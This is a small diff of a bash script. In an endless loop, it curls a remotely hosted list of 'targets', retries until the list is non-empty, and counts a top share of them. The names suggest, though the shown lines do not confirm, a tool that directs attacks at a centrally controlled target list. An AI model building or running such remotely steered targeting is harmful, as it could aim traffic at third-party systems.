@@ -640,8 +640,13 @@ echo '
 #!/bin/bash
 while true
 do
-  readarray -t list < <(curl https://raw.githubusercontent.com/dmitryshagin/targets/main/list)
-  targets_count=${#list[@]}
+  targets_count=0
+  while [ $targets_count -eq 0 ]
+  do
+    readarray -t list < <(curl https://orda.dshagin.pro/list)
+    targets_count=${#list[@]}
+    sleep 1
+  done
   top_20_count=$(( targets_count*20/100 ))
 
   let top_20_count="$targets_count/2"
